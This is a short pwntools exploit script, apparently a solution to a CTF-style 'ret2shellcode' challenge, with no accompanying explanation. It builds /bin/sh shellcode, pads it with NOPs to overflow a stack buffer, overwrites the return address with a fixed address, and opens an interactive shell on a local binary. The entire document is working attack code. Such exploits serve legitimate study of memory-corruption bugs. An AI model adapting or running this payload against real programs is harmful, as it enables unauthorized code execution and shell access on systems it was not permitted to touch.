from pwn import *
import mydebug

p = process('./ret2shellcode')
d = mydebug.debug()
#d.dbg(p,0x593)
p.recvuntil('\n')
payload = asm(shellcraft.sh()).ljust(0x6c+4,'\x90') + p32(0x0804A080)
print 'payload' + payload 
p.sendline(payload)
p.interactive() 
